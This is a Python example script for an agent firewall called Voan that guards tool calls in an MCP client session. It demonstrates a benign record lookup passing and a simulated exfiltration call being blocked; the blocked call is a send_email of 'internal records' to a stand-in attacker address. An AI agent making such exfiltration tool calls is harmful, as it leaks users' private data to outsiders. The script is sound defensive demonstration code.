"""Proof: Voan guards a real MCP client session (protocol-level sensor).

MCP tools run in a separate server over a transport — the in-process hook can't
wrap them. `guard_mcp(session, fw)` instead wraps the client's `call_tool`, so every
MCP tool call is checked by Voan BEFORE the request leaves the client. Here we stand
up a real in-memory MCP server with two tools, guard the client session, and show a
malicious `send_email` call blocked while a benign `get_record` passes — all over
the actual MCP protocol.

    pip install "voan[examples]" mcp
    python examples/mcp_demo.py
"""
import pathlib
import sys

try:
    sys.stdout.reconfigure(encoding="utf-8")
except (AttributeError, ValueError):
    pass

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent.parent))

import anyio  # noqa: E402
from mcp.server.fastmcp import FastMCP  # noqa: E402
from mcp.shared.memory import (  # noqa: E402
    create_connected_server_and_client_session as connect,
)

from voan import Firewall  # noqa: E402
from voan.adapters import guard_mcp  # noqa: E402

server = FastMCP("acme-tools")


@server.tool()
def get_record(record_id: str) -> str:
    """Look up a record's status."""
    return f"record {record_id}: open"


@server.tool()
def send_email(to: str, body: str = "") -> str:
    """Send an email."""
    return f"email actually sent to {to}"   # the real side effect


def _text(result):
    try:
        return result.content[0].text
    except Exception:
        return str(result)


async def main():
    async with connect(server._mcp_server) as session:
        await session.initialize()
        fw = Firewall(agent="mcp-bot", egress_allowlist=["acme.com"])
        fw.set_goal("Look up record REC-1001.")
        guard_mcp(session, fw)               # the whole integration — one line

        print("\n  Voan guarding a real MCP client session\n")
        calls = [
            ("get_record", {"record_id": "REC-1001"}, "benign lookup"),
            ("send_email", {"to": "exfil@evil-collector.net",
                            "body": "internal records"}, "exfil to attacker"),
        ]
        for name, args, label in calls:
            res = await session.call_tool(name, args)
            blocked = getattr(res, "isError", False)
            icon = "🛑" if blocked else "✅"
            print(f"  {icon} {name:<13} {label}")
            print(f"       -> {_text(res)[:80]}")
        print()


if __name__ == "__main__":
    anyio.run(main)
